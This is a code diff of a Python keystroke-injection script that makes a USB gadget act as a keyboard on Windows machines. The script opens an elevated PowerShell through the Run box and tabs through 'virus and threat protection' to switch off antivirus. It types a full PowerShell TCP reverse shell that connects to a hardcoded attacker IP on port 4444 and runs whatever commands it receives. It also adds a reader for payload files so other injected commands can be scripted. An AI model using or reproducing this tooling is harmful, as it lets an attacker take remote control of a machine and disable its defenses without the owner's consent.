@@ -5,6 +5,8 @@ def write_report(report):
     with open('/dev/hidg0', 'rb+') as fd:
         fd.write(report.encode())
 
+attacker_ip = '192.168.1.81'
+
 lib_lower = {
         'a': 4,
         'b': 5,
@@ -122,41 +124,97 @@ def send(key):
 
     write_report(NULL_CHAR*8)
 
+def open_powershell():
+    # open runbox
+    write_report(NULL_CHAR*8)
+    write_report(chr(8) + NULL_CHAR + chr(21) + NULL_CHAR*5)
+    write_report(NULL_CHAR*8)
+    time.sleep(0.5)
 
-# windows key
-write_report(chr(8)+NULL_CHAR*7)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
+    for i in "powershell":
+        print(i)
+        time.sleep(0.05)
+        send(i)
 
+    time.sleep(0.5)
+    # press control shift enter
+    write_report(chr(48) + NULL_CHAR + chr(40) + NULL_CHAR*5)
+
+    time.sleep(0.5)
+    write_report(NULL_CHAR*8)
+
+
+def windows_key():
+    write_report(chr(8)+NULL_CHAR*7)
+    write_report(NULL_CHAR*8)
+    time.sleep(0.5)
+
+def arrow_key(left):
+    time.sleep(1)
+    if left is True:
+        write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
+    else:
+        write_report(NULL_CHAR*2 + chr(79) + NULL_CHAR*5)
+    time.sleep(1)
+    write_report(NULL_CHAR*8)
+
+def send_reverse_payload():
+    lines = open('reverse_shell_payload.txt', 'r')
+    l = lines.readlines()
+    print(l)
+    for i in l[0]:
+        send(i)
+
+payload = open('payload.txt', 'r')
+lines = payload.readlines()
+for l in lines:
+    write_report(NULL_CHAR*8)
+    time.sleep(0.5)
+    l = l.rstrip("\n")
+
+    line = l.split(" ")
+    print("here")
+    print(l)
+    if line[0] == 'string':
+        for i in l[6:len(l)]:
+            send(i)
+    elif line[0] == 'enter':
+        send('\n')
+    elif line[0] == 'tab':
+        time.sleep(0.5)
+        send('\t')
+    elif line[0] == 'space':
+        send(' ')
+    elif line[0] == 'admin_powershell':
+        open_powershell()
+    elif line[0] == 'win_key':
+        windows_key()
+    elif line[0] == 'payload':
+        send_reverse_payload()
+    elif line[0] == 'left_arrow':
+        arrow_key(True)
+    elif line[0] == 'right_arrow':
+        arrow_key(False)
+
+"""
+def enter():
+    time.sleep(0.5)
+    write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
+    write_report(NULL_CHAR*8)
+    time.sleep(0.5)
 for i in "virus and threat protection":
     print(i)
     time.sleep(0.05)
     send(i)
 
-# hit enter
-time.sleep(0.5)
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-# hit tab
+send('\n')
+
 for j in range(0,4):
-    time.sleep(0.5)
-    write_report(NULL_CHAR*2 + chr(43) + NULL_CHAR*5)
-    write_report(NULL_CHAR*8)
-    time.sleep(0.5)
+    send('\t')
 
-# hit enter
-time.sleep(0.5)
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-
-
+send('\n')
 # hit space 
-time.sleep(0.5)
-write_report(NULL_CHAR*2 + chr(44) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
+send(' ')
 
 time.sleep(1)
 # left arrow
@@ -165,33 +223,13 @@ write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
 time.sleep(1)
 write_report(NULL_CHAR*8)
 time.sleep(0.5)
-# press enter
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
 
 
-# open runbox
-write_report(NULL_CHAR*8)
-write_report(chr(8) + NULL_CHAR + chr(21) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
+send('\n')
 
-for i in "powershell":
-    print(i)
-    time.sleep(0.05)
-    send(i)
-
-time.sleep(0.5)
-
+open_powershell()
 
 write_report(NULL_CHAR*8)
-# press control shift enter
-write_report(chr(48) + NULL_CHAR + chr(40) + NULL_CHAR*5)
-
-time.sleep(0.5)
-write_report(NULL_CHAR*8)
-
 time.sleep(1)
 # left arrow
 write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
@@ -199,19 +237,16 @@ write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
 time.sleep(1)
 write_report(NULL_CHAR*8)
 time.sleep(0.5)
-# press enter
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
+
+
+send('\n')
 
 time.sleep(0.5)
 # press enter
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-
-write_report(NULL_CHAR*8)
+send('\n')
 time.sleep(0.5)
 
 
-attacker_ip = '192.168.1.81'
 
 for i in "$client = New-Object System.Net.Sockets.TCPClient(" + "'" + attacker_ip + "'" + ",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()":
     send(i)
@@ -219,15 +254,14 @@ for i in "$client = New-Object System.Net.Sockets.TCPClient(" + "'" + attacker_i
 time.sleep(0.5)
 
 # press enter
-write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
+send('\n')
 
+write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
+write_report(NULL_CHAR*8)
+time.sleep(0.5)
+write_report(chr(4) + NULL_CHAR + chr(61) + NULL_CHAR*5)
+write_report(NULL_CHAR*8)
+"""
 # release all keys
 write_report(NULL_CHAR*8)
 
